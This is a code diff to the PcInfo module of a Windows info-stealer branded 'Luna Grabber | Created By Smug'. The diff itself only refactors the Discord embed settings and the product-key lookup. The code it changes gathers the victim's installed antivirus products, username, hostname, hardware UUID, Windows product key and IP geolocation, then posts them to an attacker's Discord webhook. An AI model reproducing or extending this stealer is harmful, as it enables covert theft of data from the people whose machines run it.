@@ -6,6 +6,8 @@ import subprocess
 
 class PcInfo:
     def __init__(self):
+        self.avatar = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+        self.username = "Luna"
         self.get_system_info(__CONFIG__["webhook"])
 
     def get_country_code(self, country_name):
@@ -14,7 +16,7 @@ class PcInfo:
             return str(country.alpha_2).lower()
         except LookupError:
             return "white"
-
+        
     def get_all_avs(self) -> str:
         process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
         if process.returncode == 0:
@@ -33,8 +35,7 @@ class PcInfo:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-
+        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
 
         try:
             r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
@@ -79,12 +80,12 @@ class PcInfo:
                         "text": "Luna Grabber | Created By Smug"
                     },
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+                        "url": self.avatar
                     }
                 }
             ],
-            "username": "Luna",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+            "username": self.username,
+            "avatar_url": self.avatar
         }
 
         requests.post(webhook, json=data)
